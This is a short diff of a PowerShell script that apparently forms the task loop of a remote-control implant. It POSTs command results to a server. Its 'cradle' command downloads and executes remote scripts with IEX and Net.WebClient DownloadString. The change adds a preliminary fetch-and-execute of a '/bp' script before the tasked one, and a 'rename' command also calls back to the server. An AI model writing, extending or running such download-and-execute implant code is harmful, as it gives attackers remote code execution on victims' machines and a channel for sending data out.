@@ -62,9 +62,10 @@ for (;;){
             Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
         } elseif ($command -eq "cradle") {
             $script_id = $task[1]
-            $cradlel = "http" + ':' + "//$ip" + ':' + "$port/dl/$script_id"
-            $cradle = "IEX(New-Object Net.WebClient).DownloadString(`"" + $cradlel + "`");"
-            Invoke-Expression $cradle
+            $bp = "http" + ':' + "//$ip" + ':' + "$port/bp"
+            IEX(New-Object Net.WebClient).DownloadString("$bp");
+            $cradle = "http" + ':' + "//$ip" + ':' + "$port/dl/$script_id"
+            IEX(New-Object Net.WebClient).DownloadString("$cradle");
         } elseif ($command -eq "rename") {
             $url = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
 
